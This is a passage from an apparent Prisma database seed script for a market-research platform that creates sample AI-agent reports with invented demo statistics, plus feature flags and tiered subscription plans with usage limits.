          { source: 'GWI Social Media Behaviors', confidence: 95, dataPoints: 35, markets: 24 },
          { source: 'Platform Best Practices Guides', confidence: 88, dataPoints: 18, markets: 1 }
        ],
        comments: [],
        versions: [
          { version: '0.8', date: now.toISOString(), author: 'Content Creator Agent', changes: 'Initial draft for review' }
        ],
        activity: [
          { action: 'Framework drafted', user: 'Content Creator Agent', timestamp: now.toISOString() }
        ],
        dataSources: ['GWI Core', 'GWI Zeitgeist', 'Platform Analytics'],
        markets: ['United States', 'United Kingdom', 'Australia', 'Canada'],
        metadata: { generatedAt: now.toISOString(), targetAudience: 'Gen Z (16-24)', pageCount: 32 }
      },
      thumbnail: '/pdf-report-document.jpg',
      views: 0,
      createdBy: bobWilson.id
    }
  })

  // ============================================================================
  // PRODUCT DEVELOPMENT SOLUTION AREA REPORTS (2 reports)
  // ============================================================================
  await prisma.report.create({
    data: {
      id: 'product-1',
      orgId: techStartup.id,
      title: 'New Product Opportunity Landscape 2025',
      description: 'Analysis of emerging product opportunities based on unmet consumer needs, market gaps, and technology trends.',
      type: ReportType.PRESENTATION,
      status: ReportStatus.PUBLISHED,
      content: {
        agent: 'Opportunity Scout Agent',
        solutionArea: 'Product Development',
        slides: [
          { id: 1, title: 'Executive Summary', thumbnail: '/executive-summary-slide-with-key-metrics.jpg', content: 'Analysis of 45 product opportunities identified 4 high-potential areas for 2025. Top opportunity: AI-Powered Personal Finance (score: 92/100, TAM: $18B). Methodology combined 500K consumer conversations, 25K survey responses, and competitive white space mapping.' },
          { id: 2, title: 'Research Methodology', thumbnail: '/methodology-diagram.jpg', content: 'Four-stage opportunity identification: 1) Analyzed 500K consumer conversations across social and reviews. 2) Surveyed 25K consumers on unmet needs and willingness to pay. 3) Mapped competitive white spaces in each category. 4) Assessed technology readiness and barriers to entry.' },
          { id: 3, title: 'Opportunity #1: AI Personal Finance', thumbnail: '/opportunity-scorecard.jpg', content: 'AI-Powered Personal Finance - Score: 92/100. TAM: $18B and growing 24% annually. Competition: Fragmented, no dominant player. Unmet need: 68% want automated financial optimization. Barriers: Trust building, regulatory compliance. Time to market: 12-18 months with right team.' },
          { id: 4, title: 'Opportunity #2: Sustainable Subscriptions', thumbnail: '/opportunity-scorecard.jpg', content: 'Sustainable Subscription Boxes - Score: 87/100. TAM: $8B with 15% growth. Competition: Growing but differentiation possible. Unmet need: 54% want curated eco-friendly products. Barriers: Unit economics, supply chain complexity. Time to market: 6-12 months.' },
          { id: 5, title: 'Opportunity #3: Mental Wellness Gaming', thumbnail: '/opportunity-scorecard.jpg', content: 'Mental Wellness Gaming - Score: 84/100. TAM: $12B in mental wellness + gaming crossover. Competition: Emerging, few serious players. Unmet need: 71% of Gen Z want mental health support in games. Barriers: Clinical validation, stigma reduction. Time to market: 18-24 months.' },
          { id: 6, title: 'Opportunity #4: Local Community Platforms', thumbnail: '/opportunity-scorecard.jpg', content: 'Hyper-Local Community Platforms - Score: 81/100. TAM: $5B in local social/commerce. Competition: Low, Nextdoor dominant but disliked. Unmet need: 62% feel disconnected from local community. Barriers: Network effects, monetization model. Time to market: 12-18 months.' },
          { id: 7, title: 'Opportunity Matrix', thumbnail: '/opportunity-matrix-chart.jpg', content: 'Strategic fit analysis: AI Finance and Mental Wellness Gaming show highest market attractiveness and strategic fit. Sustainable Subscriptions offers fastest time to market. Local Community requires most capital for network effects. Recommendation: Pursue AI Finance as primary, Mental Wellness as secondary.' },
          { id: 8, title: 'Recommended Next Steps', thumbnail: '/next-steps-checklist.jpg', content: 'Recommended actions: 1) Deep dive research on top 2 opportunities. 2) Consumer co-creation sessions for concept validation. 3) MVP scoping and technical feasibility assessment. 4) Financial modeling and investment requirements. 5) Go/no-go decision within 6 weeks.' }
        ],
        citations: [
          { source: 'GWI Consumer Trends 2024', confidence: 96, dataPoints: 58, markets: 32 },
          { source: 'GWI Custom Survey - Product Needs', confidence: 98, dataPoints: 25000, markets: 8 },
          { source: 'Competitive Intelligence Database', confidence: 91, dataPoints: 45, markets: 12 }
        ],
        comments: [],
        versions: [
          { version: '1.0', date: now.toISOString(), author: 'Opportunity Scout Agent', changes: 'Initial opportunity analysis' }
        ],
        activity: [
          { action: 'Analysis completed', user: 'Opportunity Scout Agent', timestamp: now.toISOString() }
        ],
        dataSources: ['GWI Core', 'GWI Custom', 'Social Listening', 'Competitive Intel'],
        markets: ['United States', 'United Kingdom', 'Germany', 'Japan', 'Australia'],
        metadata: { generatedAt: now.toISOString(), opportunitiesEvaluated: 45, dataPoints: 125000 }
      },
      thumbnail: '/presentation-slides.png',
      agentId: startupResearchAgent.id,
      views: 876,
      createdBy: bobWilson.id
    }
  })

  await prisma.report.create({
    data: {
      id: 'product-2',
      orgId: techStartup.id,
      title: 'Feature Prioritization Matrix: Mobile App',
      description: 'Data-driven feature prioritization for mobile app roadmap based on user demand, effort, and strategic value.',
      type: ReportType.DASHBOARD,
      status: ReportStatus.PUBLISHED,
      content: {
        agent: 'Feature Prioritizer Agent',
        solutionArea: 'Product Development',
        slides: [
          { id: 1, title: 'Executive Summary', thumbnail: '/executive-summary-slide-with-key-metrics.jpg', content: 'Feature prioritization analysis of 28 candidate features for mobile app roadmap. Top P0 features: Offline Mode (score: 94) and Social Sharing (score: 88). Expected impact: +12% retention, +8 NPS points, +15% conversion if P0 and P1 features shipped in H1.' },
          { id: 2, title: 'Prioritization Matrix', thumbnail: '/prioritization-matrix-chart.jpg', content: 'Feature placement by value vs. effort: Quick Wins (high value, low effort) - Social Sharing, Dark Mode. Strategic Bets (high value, high effort) - Offline Mode, Biometric Login. Fill-ins (low value, low effort) - Custom Notifications. Deprioritize (low value, high effort) - AR Features.' },
          { id: 3, title: 'P0 Features: Must Have', thumbnail: '/feature-detail-card.jpg', content: 'P0 Priority Features: Offline Mode - Score 94, user demand VERY HIGH, effort MEDIUM. Critical for users with inconsistent connectivity (38% of base). Social Sharing - Score 88, user demand HIGH, effort LOW. Drives organic acquisition, requested by 45% of users in feedback.' },
          { id: 4, title: 'P1 Features: Should Have', thumbnail: '/feature-detail-card.jpg', content: 'P1 Priority Features: Dark Mode - Score 85, user demand HIGH, effort LOW. #3 most requested feature, industry standard. Biometric Login - Score 82, user demand HIGH, effort MEDIUM. Security expectation for 67% of users, reduces login friction by 3x.' },
          { id: 5, title: 'P2-P3 Features: Future Consideration', thumbnail: '/feature-detail-card.jpg', content: 'Lower priority features: Custom Notifications (P2) - Score 78, nice-to-have personalization. AR Features (P3) - Score 65, innovative but low current demand, high technical complexity. Recommendation: Revisit AR in 6 months as technology matures.' },
          { id: 6, title: 'User Request Analysis', thumbnail: '/user-request-volume-chart.jpg', content: 'User feedback analysis (15,000 data points): Offline Mode - 2,340 requests, trending up. Social Sharing - 1,890 requests, steady. Dark Mode - 1,650 requests, seasonal spikes. Biometric - 1,420 requests, growing with security concerns. Data from support tickets, app reviews, surveys.' },
          { id: 7, title: 'Competitive Gap Analysis', thumbnail: '/competitive-gap-chart.jpg', content: 'Feature comparison vs. top 3 competitors: Offline Mode - 2 of 3 competitors have it. Social Sharing - 3 of 3 competitors have it (gap!). Dark Mode - 3 of 3 competitors have it (gap!). Personalization - 1 of 3 competitors advanced. Closing Social and Dark Mode gaps is urgent.' },
          { id: 8, title: 'Recommended Roadmap', thumbnail: '/roadmap-timeline.jpg', content: 'Suggested development timeline: Q1 - Offline Mode + Social Sharing (P0 features). Q2 - Dark Mode + Biometric Login (P1 features). Q3 - Custom Notifications (P2). Q4 - AR Features exploration/prototype. Expected outcomes: Feature parity by Q2, differentiation by Q4.' }
        ],
        citations: [
          { source: 'User Feedback Database', confidence: 99, dataPoints: 15000, markets: 1 },
          { source: 'App Store Reviews Analysis', confidence: 94, dataPoints: 8500, markets: 12 },
          { source: 'Competitive Feature Audit', confidence: 96, dataPoints: 84, markets: 5 }
        ],
        comments: [],
        versions: [
          { version: '1.1', date: now.toISOString(), author: 'Feature Prioritizer Agent', changes: 'Updated with Q4 feedback data' }
        ],
        activity: [
          { action: 'Matrix generated', user: 'Feature Prioritizer Agent', timestamp: new Date(now.getTime() - 259200000).toISOString() },
          { action: 'Feedback data refreshed', user: 'Product Team', timestamp: now.toISOString() }
        ],
        dataSources: ['User Feedback', 'App Reviews', 'Support Tickets', 'Competitive Intel'],
        markets: ['United States', 'United Kingdom', 'Germany', 'France', 'Japan'],
        metadata: { featuresEvaluated: 28, userFeedbackPoints: 15000, competitorsAnalyzed: 5 }
      },
      thumbnail: '/analytics-dashboard.png',
      agentId: startupResearchAgent.id,
      views: 445,
      createdBy: bobWilson.id
    }
  })

  // ============================================================================
  // MARKET RESEARCH SOLUTION AREA REPORTS (2 reports)
  // ============================================================================
  await prisma.report.create({
    data: {
      id: 'research-1',
      orgId: enterpriseCo.id,
      title: 'Financial Services Market Landscape Report',
      description: 'Comprehensive market analysis of the financial services sector including market sizing, segmentation, and growth opportunities.',
      type: ReportType.PDF,
      status: ReportStatus.PUBLISHED,
      content: {
        agent: 'Market Mapper Agent',
        solutionArea: 'Market Research',
        slides: [
          { id: 1, title: 'Executive Summary', thumbnail: '/executive-summary-slide-with-key-metrics.jpg', content: 'Global financial services market valued at $12.5T with 8.2% CAGR through 2028. Key drivers: digital transformation, emerging market growth, and generational wealth transfer. Digital-first players capturing share from traditional institutions. Regulatory complexity increasing across all regions.' },
          { id: 2, title: 'Global Market Sizing', thumbnail: '/market-size-chart.jpg', content: 'Market breakdown by region: North America - $4.8T (38% share), 6.5% growth. Europe - $3.2T (26% share), 5.8% growth. Asia Pacific - $3.5T (28% share), 12.5% growth - fastest growing region. Rest of World - $1.0T (8% share), 9.2% growth. APAC expected to surpass North America by 2030.' },
          { id: 3, title: 'Segment Analysis: Retail Banking', thumbnail: '/segment-analysis-chart.jpg', content: 'Retail Banking segment: $4.2T market size. Trend: Consolidating as digital banks gain share. Opportunity: Digital-only banks capturing 15% of new accounts. Traditional banks losing 2-3% market share annually. Winners: Those investing in mobile experience and personalization.' },
          { id: 4, title: 'Segment Analysis: Wealth Management', thumbnail: '/segment-analysis-chart.jpg', content: 'Wealth Management segment: $3.1T market size. Trend: Growing with wealth transfer to millennials. Opportunity: Robo-advisory democratizing access, $2.4T in robo AUM by 2025. Key shift: Self-directed investing up 45% since 2020. Winners: Hybrid models combining digital + human advice.' },
          { id: 5, title: 'Segment Analysis: Insurance & Payments', thumbnail: '/segment-analysis-chart.jpg', content: 'Insurance: $2.8T market, transforming via InsurTech. Usage-based models growing 28% annually. Embedded insurance emerging in e-commerce. Payments: $2.4T market, disruption accelerating. BNPL captured 5% of e-commerce. Embedded finance reshaping who offers financial services.' },
          { id: 6, title: 'Competitive Landscape', thumbnail: '/competitive-landscape-map.jpg', content: 'Four competitive tiers: Global Leaders - JPMorgan, HSBC, diversified and tech-investing. Regional Champions - strong in home markets, digital laggards. Specialists - focused players like Stripe, Robinhood winning niches. Disruptors - neobanks, fintechs attacking specific pain points. Tier blurring as everyone becomes fintech.' },
          { id: 7, title: 'Consumer Trends Shaping the Market', thumbnail: '/consumer-trends-chart.jpg', content: 'Four megatrends: Trust in traditional institutions declining - 42% trust banks less than 5 years ago. Personalization demand rising - 68% expect tailored products. ESG investing mainstream - 54% consider sustainability in financial decisions. Mobile-first expectation - 78% prefer mobile app as primary channel.' },
          { id: 8, title: 'Strategic Implications', thumbnail: '/strategic-recommendations.jpg', content: 'Recommendations for market participants: 1) Accelerate digital transformation - table stakes for survival. 2) Partner with fintechs rather than build everything in-house. 3) Invest heavily in data and analytics capabilities. 4) Redesign around customer experience, not products. 5) Prepare for embedded finance disruption.' }
        ],
        citations: [
          { source: 'GWI Financial Services Report 2024', confidence: 97, dataPoints: 85, markets: 48 },
          { source: 'GWI USA Financial Attitudes', confidence: 98, dataPoints: 42, markets: 1 },
          { source: 'Industry Financial Reports (Public)', confidence: 95, dataPoints: 128, markets: 24 }
        ],
        comments: [],
        versions: [
          { version: '1.0', date: now.toISOString(), author: 'Market Mapper Agent', changes: 'Initial market analysis' }
        ],
        activity: [
          { action: 'Report generated', user: 'Market Mapper Agent', timestamp: now.toISOString() }
        ],
        dataSources: ['GWI Core', 'GWI USA', 'Public Filings', 'Industry Reports'],
        markets: ['Global', 'United States', 'United Kingdom', 'Germany', 'Japan', 'China', 'Brazil'],
        metadata: { generatedAt: now.toISOString(), industry: 'Financial Services', pageCount: 68, dataPoints: 250000 }
      },
      thumbnail: '/pdf-report-document.jpg',
      agentId: enterpriseAnalysisAgent.id,
      views: 1678,
      createdBy: sarahEnterprise.id
    }
  })

  await prisma.report.create({
    data: {
      id: 'research-2',
      orgId: enterpriseCo.id,
      title: 'Consumer Survey Results: Brand Perception',
      description: 'Raw survey data export with cross-tabulations and statistical analysis of brand perception study.',
      type: ReportType.EXPORT,
      status: ReportStatus.ARCHIVED,
      content: {
        agent: 'Survey Analyzer Agent',
        solutionArea: 'Market Research',
        slides: [
          { id: 1, title: 'Executive Summary', thumbnail: '/executive-summary-slide-with-key-metrics.jpg', content: 'Brand perception study completed with 8,500 respondents across US, UK, and Germany. Key finding: Brand awareness at 67% (+4% vs. last wave), but consideration lagging at 34% (-2%). Perception gap identified between brand promise and delivery on customer service. Detailed data export available.' },
          { id: 2, title: 'Methodology Overview', thumbnail: '/methodology-diagram.jpg', content: 'Study specifications: Sample size 8,500 respondents. Methodology: Online panel with quota sampling. Field dates: September 1-15, 2024. Markets: US (n=4,000), UK (n=2,500), DE (n=2,000). Confidence level: 95%. Margin of error: ±1.1%. Weighting applied to match census demographics.' },
          { id: 3, title: 'Brand Funnel Results', thumbnail: '/brand-funnel-chart.jpg', content: 'Funnel metrics vs. prior wave: Awareness 67% (+4 pts) - marketing investment paying off. Familiarity 52% (+2 pts) - steady improvement. Consideration 34% (-2 pts) - concern area, investigate drivers. Preference 18% (flat) - holding steady. Usage 12% (+1 pt) - slight growth.' },
          { id: 4, title: 'Perceptual Mapping', thumbnail: '/perceptual-map-chart.jpg', content: 'Brand positioning vs. competitors: Strong association with Innovation (82% agree) and Quality (78% agree). Weak association with Value (41% agree) and Customer Service (38% agree). Nearest competitor positioned closer to Value. Opportunity: Close service perception gap to improve consideration.' },
          { id: 5, title: 'Segment Analysis', thumbnail: '/segment-breakdown-chart.jpg', content: 'Performance by segment: Premium Seekers - highest awareness (78%) and preference (28%). Value Hunters - lowest consideration (22%), price barrier. Young Professionals - highest growth potential, 45% unfamiliar with brand. Loyalists - strong NPS (+52) but small segment (8% of market).' },
          { id: 6, title: 'Verbatim Themes', thumbnail: '/word-cloud-visualization.jpg', content: 'Open-ended response analysis (3,200 coded responses): Positive themes - Product quality (42%), Innovation (38%), Design (31%). Negative themes - Price (45%), Wait times (28%), Support experience (24%). Emerging theme: Sustainability increasingly mentioned (+15% vs. last wave).' },
          { id: 7, title: 'Data Export Contents', thumbnail: '/data-export-list.jpg', content: 'Available data exports: raw_responses.csv - 8,500 rows, 45 columns, individual responses. cross_tabs.xlsx - 12 sheets, demographics breakdowns. significance_tests.csv - statistical testing results. open_ends_coded.csv - 3,200 coded verbatims. weighting_scheme.xlsx - methodology documentation.' },
          { id: 8, title: 'Recommended Actions', thumbnail: '/recommendations-checklist.jpg', content: 'Strategic recommendations: 1) Address service perception gap - priority investigation into support experience. 2) Develop value-tier messaging for price-sensitive segments. 3) Increase familiarity among Young Professionals with targeted campaign. 4) Leverage sustainability messaging - growing importance. 5) Track consideration closely in next wave.' }
        ],
        citations: [
          { source: 'GWI Custom Survey - Brand Perception Q3 2024', confidence: 99, dataPoints: 8500, markets: 3 },
          { source: 'Previous Wave Comparison Data', confidence: 98, dataPoints: 8200, markets: 3 },
          { source: 'Category Benchmark Database', confidence: 94, dataPoints: 45, markets: 3 }
        ],
        comments: [],
        versions: [
          { version: '1.0', date: now.toISOString(), author: 'Survey Analyzer Agent', changes: 'Initial data export and analysis' }
        ],
        activity: [
          { action: 'Survey data processed', user: 'Survey Analyzer Agent', timestamp: new Date(now.getTime() - 1209600000).toISOString() },
          { action: 'Report archived', user: 'Research Team', timestamp: now.toISOString() }
        ],
        dataSources: ['GWI Custom Survey', 'Historical Tracking Data'],
        markets: ['United States', 'United Kingdom', 'Germany'],
        metadata: { generatedAt: now.toISOString(), studyType: 'Brand Tracking', wave: 'Q3 2024', sampleSize: 8500, marginOfError: '±1.1%' }
      },
      thumbnail: '/analytics-dashboard.png',
      agentId: enterpriseAnalysisAgent.id,
      views: 923,
      createdBy: sarahEnterprise.id
    }
  })

  // ============================================================================
  // INNOVATION SOLUTION AREA REPORTS (2 reports)
  // ============================================================================
  await prisma.report.create({
    data: {
      id: 'innovation-1',
      orgId: acmeCorp.id,
      title: 'Emerging Trends Synthesis: AI & Consumer Tech',
      description: 'Synthesis of emerging technology trends and their implications for consumer behavior and business strategy.',
      type: ReportType.PRESENTATION,
      status: ReportStatus.PUBLISHED,
      content: {
        agent: 'Trend Synthesizer Agent',
        solutionArea: 'Innovation',
        slides: [
          { id: 1, title: 'Executive Summary', thumbnail: '/executive-summary-slide-with-key-metrics.jpg', content: 'Analysis of 28 emerging technology trends identifies 4 transformational shifts for 2025. Generative AI leads with 42% consumer adoption and accelerating. Key synthesis: AI + Ambient Computing + Spatial Tech = seamless, personalized, immersive consumer experiences. Action required within 12-18 months.' },
          { id: 2, title: 'Trend #1: Generative AI Mainstream', thumbnail: '/trend-analysis-chart.jpg', content: 'Generative AI adoption metrics: 42% of consumers have used generative AI tools. Maturity: Emerging, crossing into mainstream. Timeline: 12-18 months to ubiquity. Implications: Content creation democratized, search behavior fundamentally changing, trust and authenticity becoming critical differentiators.' },
          { id: 3, title: 'Trend #2: Ambient Computing', thumbnail: '/trend-analysis-chart.jpg', content: 'Ambient Computing evolution: 18% current consumer adoption, growing rapidly. Maturity: Early stage, significant infrastructure investment ongoing. Timeline: 24-36 months for mainstream. Implications: Screenless interactions becoming normalized, privacy expectations being redefined, always-on engagement opportunities.' },
          { id: 4, title: 'Trend #3: Spatial Computing', thumbnail: '/trend-analysis-chart.jpg', content: 'Spatial Computing (AR/VR) status: 24% consumer adoption, Apple Vision Pro catalyzing interest. Maturity: Emerging, hardware improving rapidly. Timeline: 18-24 months for consumer tipping point. Implications: Immersive commerce experiences, virtual product trials, entirely new content formats required.' },
          { id: 5, title: 'Trend #4: Decentralized Identity', thumbnail: '/trend-analysis-chart.jpg', content: 'Decentralized Identity movement: 8% current awareness/adoption, niche but growing. Maturity: Early stage, regulatory tailwinds building. Timeline: 36-48 months for meaningful adoption. Implications: User data ownership shifting, portable digital identity emerging, new trust models required.' },
          { id: 6, title: 'Trend Convergence Analysis', thumbnail: '/trend-convergence-diagram.jpg', content: 'Converging trend synthesis: AI + Ambient + Spatial technologies are not independent - they combine to create seamless, personalized, immersive consumer experiences. Example: AI-powered voice assistant (ambient) helps you virtually try on clothes (spatial) with personalized recommendations (AI). Winners will integrate across all three.' },
          { id: 7, title: 'Business Impact Assessment', thumbnail: '/business-impact-matrix.jpg', content: 'Implications by function: Marketing - AI-generated personalization at scale, new immersive ad formats. Product - Voice and gesture interfaces, spatial features, embedded AI assistants. Operations - AI automation of routine tasks, predictive everything, digital twins for planning.' },
          { id: 8, title: 'Strategic Recommendations', thumbnail: '/strategic-recommendations.jpg', content: 'Priority actions for 2025: 1) Establish AI governance framework immediately. 2) Begin experimenting with spatial content and commerce. 3) Develop voice interface strategy for key touchpoints. 4) Monitor decentralization signals for strategic timing. 5) Allocate 10-15% of innovation budget to convergence experiments.' }
        ],
        citations: [
          { source: 'GWI Tech Consumer Trends 2024', confidence: 96, dataPoints: 62, markets: 38 },
          { source: 'GWI Zeitgeist - AI Adoption Tracker', confidence: 98, dataPoints: 28, markets: 24 },
          { source: 'Technology Industry Analysis (150 sources)', confidence: 88, dataPoints: 150, markets: 1 }
        ],
        comments: [],
        versions: [
          { version: '1.0', date: now.toISOString(), author: 'Trend Synthesizer Agent', changes: 'Initial trend synthesis' }
        ],
        activity: [
          { action: 'Trend analysis completed', user: 'Trend Synthesizer Agent', timestamp: now.toISOString() }
        ],
        dataSources: ['GWI Core', 'GWI Zeitgeist', 'Tech Industry Sources', 'Patent Filings'],
        markets: ['Global', 'United States', 'China', 'United Kingdom', 'Germany', 'Japan'],
        metadata: { generatedAt: now.toISOString(), trendsAnalyzed: 28, sourcesReviewed: 150 }
      },
      thumbnail: '/presentation-slides.png',
      agentId: marketResearchAgent.id,
      views: 1534,
      createdBy: adminUser.id
    }
  })

  await prisma.report.create({
    data: {
      id: 'innovation-2',
      orgId: techStartup.id,
      title: 'Innovation Validation Report: Smart Home Products',
      description: 'Consumer validation study for new smart home product concepts including desirability, feasibility, and viability assessment.',
      type: ReportType.PDF,
      status: ReportStatus.DRAFT,
      content: {
        agent: 'Innovation Validator Agent',
        solutionArea: 'Innovation',
        slides: [
          { id: 1, title: 'Executive Summary', thumbnail: '/executive-summary-slide-with-key-metrics.jpg', content: 'Validation study of 5 smart home concepts with 2,545 respondents. Top performer: Family Wellness Hub (score 77/100) - recommend accelerating. Strong runner-up: Smart Security Companion (score 74/100). Concept E (Elderly Care) shows highest emotional need but requires business model pivot to B2B2C.' },
          { id: 2, title: 'Study Methodology', thumbnail: '/methodology-diagram.jpg', content: 'Research approach: Quantitative concept testing with n=2,500 representative consumers. Qualitative deep dives with n=45 target users. Evaluation framework: Desirability (would they want it), Feasibility (can we build it), Viability (can we profit from it). Each dimension scored 0-100.' },
          { id: 3, title: 'Concept A: AI Home Manager', thumbnail: '/concept-scorecard.jpg', content: 'AI Home Manager - Total Score: 72/100. Desirability: 78, Feasibility: 65, Viability: 72. Verdict: Proceed with refinement. Key feedback: Strong interest in automation, but significant privacy concerns. Price sensitivity high - must demonstrate clear value. Recommendation: Address privacy prominently, develop ROI calculator.' },
          { id: 4, title: 'Concept B: Predictive Energy System', thumbnail: '/concept-scorecard.jpg', content: 'Predictive Energy System - Total Score: 69/100. Desirability: 82, Feasibility: 58, Viability: 68. Verdict: Technical validation needed. Key feedback: Sustainability appeal very strong with target audience. ROI must be crystal clear for purchase decision. Installation complexity concerns. Recommendation: Partner with installers, simplify setup.' },
          { id: 5, title: 'Concept C: Family Wellness Hub', thumbnail: '/concept-scorecard.jpg', content: 'Family Wellness Hub - Total Score: 77/100 (HIGHEST). Desirability: 85, Feasibility: 72, Viability: 75. Verdict: Strong candidate - accelerate. Key feedback: High emotional resonance with parents. Trust in health data handling is critical differentiator. Integration with existing devices strongly desired. Recommendation: Fast-track development.' },
          { id: 6, title: 'Concept D: Smart Security Companion', thumbnail: '/concept-scorecard.jpg', content: 'Smart Security Companion - Total Score: 74/100. Desirability: 71, Feasibility: 80, Viability: 70. Verdict: Proceed but differentiation needed. Key feedback: Crowded market with established players. AI features are key differentiator from Ring/Nest. Subscription model resistance significant. Recommendation: Lead with AI, consider hardware-only model.' },
          { id: 7, title: 'Concept E: Elderly Care Monitor', thumbnail: '/concept-scorecard.jpg', content: 'Elderly Care Monitor - Total Score: 73/100. Desirability: 88 (HIGHEST), Feasibility: 68, Viability: 62. Verdict: Pivot business model. Key feedback: Strongest emotional need score across all concepts. Adult children highly motivated buyers. B2B2C opportunity via healthcare providers, senior living facilities. Recommendation: Explore enterprise partnerships.' },
          { id: 8, title: 'Recommended Actions & Timeline', thumbnail: '/action-plan-timeline.jpg', content: 'Priority actions: 1) Fast-track Concept C (Family Wellness Hub) - begin business case immediately. 2) Conduct technical deep-dive on Concept B energy system feasibility. 3) Explore B2B partnerships for Concept E elderly care. 4) Park Concepts A and D for future consideration. Timeline: Concept C business case (weeks 1-2), prototype (weeks 3-4), beta test (weeks 5-8).' }
        ],
        citations: [
          { source: 'GWI Smart Home Consumer Study 2024', confidence: 97, dataPoints: 48, markets: 8 },
          { source: 'Custom Concept Testing Survey', confidence: 99, dataPoints: 2545, markets: 3 },
          { source: 'Qualitative Deep Dive Interviews', confidence: 92, dataPoints: 45, markets: 2 }
        ],
        comments: [],
        versions: [
          { version: '0.9', date: now.toISOString(), author: 'Innovation Validator Agent', changes: 'Draft for stakeholder review' }
        ],
        activity: [
          { action: 'Validation study completed', user: 'Innovation Validator Agent', timestamp: now.toISOString() }
        ],
        dataSources: ['GWI Core', 'Custom Survey', 'Qualitative Research'],
        markets: ['United States', 'United Kingdom', 'Germany'],
        metadata: { generatedAt: now.toISOString(), conceptsTested: 5, respondents: 2545, pageCount: 48 }
      },
      thumbnail: '/pdf-report-document.jpg',
      agentId: startupResearchAgent.id,
      views: 0,
      createdBy: bobWilson.id
    }
  })

  // ==================== ENTITLEMENT SYSTEM ====================
  console.log('🎫 Creating plans and features...')

  // Create Features
  const featureAdvancedAnalytics = await prisma.feature.create({
    data: {
      key: 'advanced_analytics',
      name: 'Advanced Analytics',
      description: 'Access to advanced analytics dashboards and reports',
      // category: 'ANALYTICS',
      valueType: 'BOOLEAN',
      defaultValue: false,
      sortOrder: 1,
    }
  })

  const featureCustomBranding = await prisma.feature.create({
    data: {
      key: 'custom_branding',
      name: 'Custom Branding',
      description: 'White-label platform with custom logos and colors',
      // category: 'CUSTOMIZATION',
      valueType: 'BOOLEAN',
      defaultValue: false,
      sortOrder: 2,
    }
  })

  const featureSso = await prisma.feature.create({
    data: {
      key: 'sso',
      name: 'Single Sign-On',
      description: 'SAML/OIDC SSO integration',
      // category: 'SECURITY',
      valueType: 'BOOLEAN',
      defaultValue: false,
      sortOrder: 3,
    }
  })

  const featureAuditLog = await prisma.feature.create({
    data: {
      key: 'audit_log',
      name: 'Audit Log',
      description: 'Detailed audit logging for compliance',
      // category: 'SECURITY',
      valueType: 'BOOLEAN',
      defaultValue: false,
      sortOrder: 4,
    }
  })

  const featureApiAccess = await prisma.feature.create({
    data: {
      key: 'api_access',
      name: 'API Access',
      description: 'Programmatic API access',
      // category: 'API',
      valueType: 'BOOLEAN',
      defaultValue: false,
      sortOrder: 5,
    }
  })

  const featurePrioritySupport = await prisma.feature.create({
    data: {
      key: 'priority_support',
      name: 'Priority Support',
      description: '24/7 priority customer support',
      // category: 'SUPPORT',
      valueType: 'BOOLEAN',
      defaultValue: false,
      sortOrder: 6,
    }
  })

  const featureDataExport = await prisma.feature.create({
    data: {
      key: 'data_export',
      name: 'Data Export',
      description: 'Export data to CSV, Excel, and other formats',
      // category: 'CORE',
      valueType: 'BOOLEAN',
      defaultValue: true,
      sortOrder: 7,
    }
  })

  const featureCustomAgents = await prisma.feature.create({
    data: {
      key: 'custom_agents',
      name: 'Custom Agents',
      description: 'Create and configure custom AI agents',
      // category: 'AGENTS',
      valueType: 'BOOLEAN',
      defaultValue: false,
      sortOrder: 8,
    }
  })

  const featureAdvancedWorkflows = await prisma.feature.create({
    data: {
      key: 'advanced_workflows',
      name: 'Advanced Workflows',
      description: 'Complex multi-step workflow automation',
      // category: 'AGENTS',
      valueType: 'BOOLEAN',
      defaultValue: false,
      sortOrder: 9,
    }
  })

  const featureMultiTenant = await prisma.feature.create({
    data: {
      key: 'multi_tenant',
      name: 'Multi-Tenant Hierarchy',
      description: 'Manage multiple organizations in a hierarchy',
      // category: 'ADVANCED',
      valueType: 'BOOLEAN',
      defaultValue: false,
      sortOrder: 10,
    }
  })

  // Create Plans
  const starterPlan = await prisma.plan.create({
    data: {
      name: 'starter',
      displayName: 'Starter',
      description: 'Perfect for small teams getting started',
      tier: 'STARTER',
      isActive: true,
      isPublic: true,
      sortOrder: 1,
      monthlyPrice: 0,
      yearlyPrice: 0,
      limits: {
        agentRuns: 100,
        teamSeats: 3,
        dataSources: 5,
        apiCallsPerMin: 100,
        retentionDays: 30,
        tokensPerMonth: 100000,
        dashboards: 3,
        reports: 10,
        workflows: 2,
        brandTrackings: 1,
      },
    }
  })

  const professionalPlan = await prisma.plan.create({
    data: {
      name: 'professional',
      displayName: 'Professional',
      description: 'For growing teams that need more power',
      tier: 'PROFESSIONAL',
      isActive: true,
      isPublic: true,
      sortOrder: 2,
      monthlyPrice: 9900, // $99
      yearlyPrice: 99900, // $999
      limits: {
        agentRuns: 1000,
        teamSeats: 10,
        dataSources: 25,
        apiCallsPerMin: 500,
        retentionDays: 90,
        tokensPerMonth: 1000000,
        dashboards: 20,
        reports: 100,
        workflows: 10,
        brandTrackings: 5,
      },
    }
  })

  const enterprisePlan = await prisma.plan.create({
    data: {
      name: 'enterprise',
      displayName: 'Enterprise',
      description: 'For large organizations with advanced needs',
      tier: 'ENTERPRISE',
      isActive: true,
      isPublic: true,
      sortOrder: 3,
      monthlyPrice: 49900, // $499
      yearlyPrice: 499900, // $4999
      limits: {
        agentRuns: -1, // unlimited
        teamSeats: -1,
        dataSources: -1,
        apiCallsPerMin: 2000,
        retentionDays: 365,
        tokensPerMonth: -1,
        dashboards: -1,
        reports: -1,
        workflows: -1,
        brandTrackings: -1,
      },
    }
  })

  // Additional plans to reach 10+
  await prisma.plan.create({
    data: {
      name: 'trial',
      displayName: 'Trial',
      description: '14-day free trial with full Professional features',
      tier: 'PROFESSIONAL',
      isActive: true,
      isPublic: true,
      sortOrder: 0,
      monthlyPrice: 0,
      yearlyPrice: 0,
      trialDays: 14,
      limits: {
        agentRuns: 500,
        teamSeats: 5,
        dataSources: 10,
        apiCallsPerMin: 300,
        retentionDays: 14,
        tokensPerMonth: 500000,
        dashboards: 10,
        reports: 50,
        workflows: 5,
        brandTrackings: 3,
      },
    }
  })

  await prisma.plan.create({
    data: {
      name: 'basic',
      displayName: 'Basic',
      description: 'Essential features for individual researchers',
      tier: 'STARTER',
      isActive: true,
      isPublic: true,
      sortOrder: 1,
      monthlyPrice: 2900, // $29
      yearlyPrice: 29900, // $299
      limits: {
        agentRuns: 250,
        teamSeats: 1,
        dataSources: 10,
        apiCallsPerMin: 150,
        retentionDays: 60,
        tokensPerMonth: 250000,
        dashboards: 5,
        reports: 25,
        workflows: 3,
